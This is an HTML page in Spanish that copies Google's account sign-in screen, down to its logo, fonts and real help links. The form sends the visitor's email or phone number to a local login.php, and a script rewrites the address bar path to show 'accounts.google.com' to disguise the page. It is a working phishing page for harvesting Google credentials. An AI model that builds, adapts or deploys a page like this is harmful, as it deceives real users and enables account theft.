<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Zen+Kaku+Gothic+Antique&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./styles.css">
    <link rel="icon" type="image/png" href="./gfavicon.png" />
    <title>Inicia sesión: Cuentas de Google</title>
</head>

<body>
    <main class="inputContainer">
        <img src="./google.png" alt="" width="87" height="33">
        <h2 class="login">Iniciar sesión</h2>
        <h4 class="use">Utiliza tu cuenta de Google</h4>
        <form action="login.php" method="POST">
            <input type="text" name="usuario" class="gInput" placeholder="Correo electrónico o teléfono" autofocus>
            <label class="inputLabel"></label>
            <div class="forgotContainer">
                <a href="https://accounts.google.com/signin/v2/usernamerecovery" onclick="this.target='_blank'">
                    <h5 class="forgot">¿Has olvidado tu correo electrónico?</h5>
                </a>
            </div>
            <h4 class="guest">¿No es tu ordenador? Usa una ventana privada para iniciar sesión. <a
                    href="https://support.google.com/accounts?p=signin_privatebrowsing&amp;hl=es"
                    onclick="this.target='_blank'"><span class="masInfo">Más información</span></a></h4>
            <div class="buttonContainer">
                <a href="https://accounts.google.com/signup/v2/webcreateaccount" class="btnCreate">Crear cuenta</a>
                <a href="./login.php" class="btnNext"><button type="submit" class="btnNext">Siguiente</button></a>
            </div>
        </form>
    </main>
    <script>
        window.history.pushState({}, '', 'accounts.google.com')
    </script>
</body>

</html>
